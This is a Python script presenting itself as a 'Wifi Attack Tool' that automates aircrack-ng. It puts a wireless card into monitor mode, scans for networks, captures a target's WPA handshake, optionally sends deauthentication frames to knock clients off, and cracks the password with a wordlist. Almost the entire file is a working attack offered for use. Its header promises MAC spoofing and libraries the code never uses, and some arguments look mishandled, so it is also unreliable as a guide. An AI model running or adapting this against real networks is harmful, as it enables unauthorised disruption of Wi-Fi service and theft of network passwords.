###########################################################################################################################################################################################################
# Run using sudo python3 wifitest.py. 
# scanning for networks, capturing handshakes, and cracking the handshake using a wordlist, whilst spoofing the source MAC Address as part of the deauthenticate_clients function. Requires installation fo tcpdump, aircrack-ng, scapy, and pyric - pip install scapy pyric.
# This script includes necessary error handling and guides users through the process with clear feedback. It provides an interactive menu for network scanning, handshake capturing, and password cracking, 
# making it more user-friendly and functional for real-world use. You will also require a wireless USB/network card that supports monitor mode & frame injection.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
###########################################################################################################################################################################################################

import subprocess
import sys
import os


# Banner
def display_splash_screen():
    splash = r"""
    
 __      __.__                 .__                                    _____   __    __                   __        ___________            .__                 _____  ____.____   __________  ___ ___    _____           _______  ____ 
/  \    /  \__|_______   ____  |  |    ____    ______  ______        /  _  \_/  |__/  |______     ____  |  | __    \__    ___/____   ____ |  |               /  |  |/_   |    |  \______   \/   |   \  /  |  |          \   _  \/_   |
\   \/\/   /  |\_  __ \_/ __ \ |  |  _/ __ \  /  ___/ /  ___/       /  /_\  \   __\   __\__  \  _/ ___\ |  |/ /      |    |  /  _ \ /  _ \|  |     ______   /   |  |_|   |    |   |     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
 \        /|  | |  | \/\  ___/ |  |__\  ___/  \___ \  \___ \       /    |    \  |  |  |  / __ \_\  \___ |    <       |    | (  <_> |  <_> )  |__  /_____/  /    ^   /|   |    |___|    |   \    Y    /    ^   / /_____/ \  \_/   \   |
  \__/\  / |__| |__|    \___  >|____/ \___  >/____  >/____  >______\____|__  /__|  |__| (____  / \___  >|__|_ \______|____|  \____/ \____/|____/           \____   | |___|_______ \____|    \___|_  /\____   |           \_____  /___|
       \/                   \/            \/      \/      \//_____/        \/                \/      \/      \/_____/                                           |__|             \/               \/      |__|                 \/     


                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/
                                 /\      {====}     )___(
                      (\=,      //\\      )__(     /_____\
      __    |'-'-'|  //  .\    (    )    /____\     |   |
     /  \   |_____| (( \_  \    )__(      |  |      |   |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |
    /____\   |   |  (/     \    |  |      |  |      |   |
     |  |    |   |   | _.-'|    |  |      |  |      |   |
     |__|    )___(    )___(    /____\    /____\    /_____\
    (====)  (=====)  (=====)  (======)  (======)  (=======)
    }===={  }====={  }====={  }======{  }======{  }======={
   (______)(_______)(_______)(________)(________)(_________)
   
 
"""

    print(splash)
    print("Wifi Attack Tool 41PH4-01\n")

# Function to check if a tool is installed and install it if not
def check_and_install_tool(tool_name, install_command):
    try:
        subprocess.run([tool_name, "-h"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        print(f"{tool_name} is already installed.")
    except subprocess.CalledProcessError:
        print(f"{tool_name} is not installed. Installing...")
        subprocess.run(install_command, shell=True, check=True)

# Function to enable monitor mode on the selected interface
def enable_monitor_mode(interface):
    print(f"Enabling monitor mode on {interface}...")
    subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)  # Killing any interfering processes
    subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)  # Start monitor mode
    return f"{interface}mon"

# Function to scan networks
def scan_networks(interface):
    print(f"Scanning networks on {interface}...")
    try:
        subprocess.run(["sudo", "airodump-ng", interface], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error scanning network: {e}")
        sys.exit(1)

# Function to perform deauthentication attack
def deauth_attack(interface, target_mac, channel):
    print(f"Performing deauth attack on {target_mac}...")
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", target_mac, "-c", target_mac, interface], check=True)

# Function to capture WPA handshake
def capture_handshake(interface, target_mac, output_file):
    print(f"Capturing WPA handshake on {interface}...")
    subprocess.run(["sudo", "airodump-ng", "-c", "6", "--bssid", target_mac, "-w", output_file, interface], check=True)

# Function to crack WPA handshake using aircrack-ng
def crack_wpa_handshake(output_file, wordlist):
    print(f"Attempting to crack WPA handshake using {wordlist}...")
    try:
        subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, f"{output_file}-01.cap"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error cracking WPA handshake: {e}")
        sys.exit(1)

# Main function that automates the process
def main():
    # Check if necessary tools are installed
    check_and_install_tool("airodump-ng", "sudo apt install aircrack-ng -y")
    check_and_install_tool("aireplay-ng", "sudo apt install aircrack-ng -y")
    check_and_install_tool("airmon-ng", "sudo apt install aircrack-ng -y")

    # Get the network interface
    interface = input("Enter the network interface (e.g., wlan0): ")

    # Enable monitor mode
    monitor_interface = enable_monitor_mode(interface)
    
    # Scan networks and let the user select a network
    scan_networks(monitor_interface)
    
    # Input target MAC address and output file name for capturing the handshake
    target_mac = input("Enter the MAC address of the target network: ")
    output_file = input("Enter the output file name for capturing the handshake: ")

    # Start capturing the WPA handshake
    capture_handshake(monitor_interface, target_mac, output_file)

    # Ask if the user wants to perform a deauth attack
    deauth_choice = input("Do you want to perform a deauth attack? (y/n): ")
    if deauth_choice.lower() == 'y':
        deauth_attack(monitor_interface, target_mac, "6")

    # Ask for wordlist to crack WPA
    wordlist = input("Enter the path to your wordlist (e.g., /path/to/wordlist.txt): ")

    # Attempt to crack the WPA handshake
    crack_wpa_handshake(output_file, wordlist)

    # Restart the network and cleanup
    print("Cleaning up and restarting the network...")
    subprocess.run(["sudo", "airmon-ng", "stop", monitor_interface], check=True)
    subprocess.run(["sudo", "service", "networking", "restart"], check=True)
    print("Network restarted successfully.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nProcess interrupted. Restarting the network and cleaning up...")
        subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"], check=True)
        subprocess.run(["sudo", "service", "networking", "restart"], check=True)
        sys.exit(0)
